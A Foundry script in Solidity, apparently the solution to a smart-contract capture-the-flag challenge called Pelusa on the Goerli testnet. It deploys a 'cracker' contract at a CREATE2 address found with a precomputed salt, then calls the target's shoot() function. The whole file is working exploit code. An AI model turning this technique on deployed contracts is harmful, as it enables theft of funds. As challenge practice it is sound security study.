
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

import "./PelusaCracker.sol";
import "./Pelusa.sol";

/// @dev forge script script/Attack.s.sol:Attack --rpc-url $ETH_GOERLI_RPC_URL --broadcast

contract Attack is Script {
  
  function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(deployerPrivateKey);
        bytes32 _blockhash = bytes32(0x77f4be9260151ff5835a77c1711e29cc59905a898071f57ef62a70ec6315d78a);
        address owner = calcOwner(deployer, _blockhash);

        Pelusa pelusa = Pelusa(0xFf5bffA773BCf5B93E8aeE8199053F3639245029);

        uint256 salt = 4283929308129139881373401834485707934793121675242;
        bytes memory code = getBytecode(address(pelusa), 0xbe862AD9AbFe6f22BCb087716c7D89a26051f74C);

        vm.startBroadcast(deployerPrivateKey);

        address crackerAddr;
        assembly{
            crackerAddr := create2(0, add(code, 0x20), mload(code), salt)

            if iszero(extcodesize(crackerAddr)) {
                revert(0, 0)
            }
        }

        console2.logAddress(pelusa.player());
        console2.logBool(pelusa.isGoal());

        pelusa.shoot();

        vm.stopBroadcast();
  }

  function calcOwner(address deployer, bytes32 _blockhash) public returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(deployer, _blockhash)))));
    }

    function getBytecode(address _target, address _owner) public pure returns (bytes memory) {
        bytes memory bytecode = type(PelusaCracker).creationCode;

        return abi.encodePacked(bytecode, abi.encode(_target, _owner));
    }

}
